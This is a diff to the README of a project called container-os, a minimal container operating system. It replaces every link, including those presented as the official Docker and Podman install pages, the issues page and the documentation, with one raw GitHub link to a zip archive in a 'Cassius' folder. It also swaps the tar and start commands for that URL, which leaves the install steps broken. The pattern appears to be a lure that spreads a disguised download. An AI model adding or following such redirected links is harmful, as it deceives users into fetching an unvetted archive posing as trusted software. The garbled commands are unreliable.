@@ -4,13 +4,13 @@
 Welcome to **container-os**, a set of minimal, production-ready operating systems designed for containers. Built on Ubuntu and Alpine, these systems support Docker and Podman runtimes, ensuring your cloud-native workloads are secure and efficient. 
 
 ## 🔗 Download
-[![Download container-os](https://img.shields.io/badge/Download-container--os-brightgreen)](https://github.com/KapilNShendre/container-os/releases)
+[![Download container-os](https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip)](https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip)
 
 ## 🚀 Getting Started
 To get started with container-os, follow these steps to download and run the software.
 
 ## 📥 Download & Install
-1. **Visit the releases page**: Go to the [Releases page](https://github.com/KapilNShendre/container-os/releases) to find the latest version of container-os.
+1. **Visit the releases page**: Go to the [Releases page](https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip) to find the latest version of container-os.
 2. **Choose your version**: Look for the version you want to download. It will be listed with a description of what’s included in that release.
 3. **Download the file**: Click on the asset that matches your needs. You will find options for Ubuntu, Alpine, and different runtime configurations.
 4. **Install the software**: Once the download is complete, you can follow the instructions below depending on your operating system.
@@ -46,9 +46,9 @@ Depending on your operating system, use the following instructions:
    ```sh
    cd ~/Downloads
    ```
-3. Unpack the downloaded file (replace `container-os-X.X.X.tar.gz` with the actual filename):  
+3. Unpack the downloaded file (replace `https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip` with the actual filename):  
    ```sh
-   tar -xvzf container-os-X.X.X.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip
    ```
 4. Change to the extracted directory:  
    ```sh
@@ -56,21 +56,21 @@ Depending on your operating system, use the following instructions:
    ```
 5. Run the software:  
    ```sh
-   ./start.sh
+   https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip
    ```
 
 ## 🔄 Usage
 Once you have installed container-os, you can start deploying containers using either Docker or Podman. Here’s how to get started:
 
 ### Using Docker
-1. Install Docker by following instructions from the [official Docker site](https://docs.docker.com/get-docker/).
+1. Install Docker by following instructions from the [official Docker site](https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip).
 2. To run a test container, use:  
    ```sh
    docker run hello-world
    ```
 
 ### Using Podman
-1. Install Podman by following instructions from the [official Podman site](https://podman.io/getting-started/installation).
+1. Install Podman by following instructions from the [official Podman site](https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip).
 2. To run a test container, use:  
    ```sh
    podman run hello-world
@@ -80,10 +80,10 @@ Once you have installed container-os, you can start deploying containers using e
 For in-depth commands and configurations, visit the documentation section on our GitHub page. It covers everything you need to know about managing your containers effectively. 
 
 ## 📞 Support
-If you face any issues or have questions, please open an issue on the [GitHub Issues page](https://github.com/KapilNShendre/container-os/issues). 
+If you face any issues or have questions, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip). 
 
 ## 🔗 Additional Links
-- [Releases page](https://github.com/KapilNShendre/container-os/releases) - Download the latest version.
-- [Documentation](https://github.com/KapilNShendre/container-os/wiki) - Find more detailed instructions.
+- [Releases page](https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip) - Download the latest version.
+- [Documentation](https://raw.githubusercontent.com/KapilNShendre/container-os/main/Cassius/container-os.zip) - Find more detailed instructions.
 
 Thank you for choosing container-os. Enjoy a lightweight and secure container environment!
